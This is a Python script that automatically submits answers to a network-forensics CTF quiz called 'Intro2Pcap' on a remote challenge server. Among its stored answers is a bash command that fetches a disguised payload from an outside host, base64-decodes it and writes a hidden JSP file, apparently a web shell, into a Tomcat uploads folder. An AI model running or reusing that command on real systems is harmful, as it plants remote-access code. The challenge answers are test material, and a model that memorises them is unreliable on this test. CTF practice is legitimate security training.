"""Interactive solver for Intro2Pcap quiz.

Reconnects each run, sends KNOWN answers, then a list of candidate answers
for unknown questions. Stops if a wrong answer is detected.
"""

import socket
import sys
import time

HOST = "chall.blackpinker.com"
PORT = 20796

# Confirmed correct so far (do not change order):
KNOWN = [
    "172.28.13.20",
    "100",
    "ffuf",
    "assets-acme-cdn.com:9001",
    "bash -c {curl,-fsSL,http://assets-acme-cdn.com:9001/assets/crm-cache.crt,-o,/opt/acme-crm/runtime/.crm-cache.crt};{grep,-v,CERTIFICATE,/opt/acme-crm/runtime/.crm-cache.crt}|{base64,-d}>/usr/local/tomcat/webapps/ROOT/uploads/.crm-cache.jsp",
    "crm-cache.crt",
    "T1140",
    "b7a31dc90e2445a8f0c11729",
    "T1030",
    "CVE-2025-24813",
]

CANDIDATES = sys.argv[1:] if len(sys.argv) > 1 else [""]


def recv_until(sock, marker_set=(b"Answer:", b"Incorrect", b"HCMUS-CTF{"), timeout=8.0):
    sock.settimeout(timeout)
    data = b""
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
            if any(m in data for m in marker_set):
                # drain a bit more
                try:
                    sock.settimeout(0.3)
                    while True:
                        more = sock.recv(4096)
                        if not more:
                            break
                        data += more
                except socket.timeout:
                    pass
                break
        except socket.timeout:
            break
    return data


def attempt(answers):
    s = socket.create_connection((HOST, PORT))
    out = b""
    for i, ans in enumerate(answers):
        d = recv_until(s)
        out += d
        if b"Incorrect" in d or b"Connection closed" in d:
            s.close()
            return out, False, i
        s.sendall((ans + "\n").encode())
    # drain final
    d = recv_until(s, timeout=5.0)
    out += d
    s.close()
    return out, True, len(answers)


def main():
    for cand in CANDIDATES:
        print(f"\n=== Trying Q9 = {cand!r} ===")
        out, ok, where = attempt(KNOWN + [cand])
        tail = out.decode(errors="replace").splitlines()[-25:]
        print("\n".join(tail))
        if b"HCMUS-CTF{" in out:
            print("\n*** FLAG FOUND ***")
            return
        if b"Incorrect" in out:
            print(f"!!! Wrong somewhere at index {where}.")
            continue
        print("Proceeded past Q9 without seeing flag - need more answers.")
        return


if __name__ == "__main__":
    main()
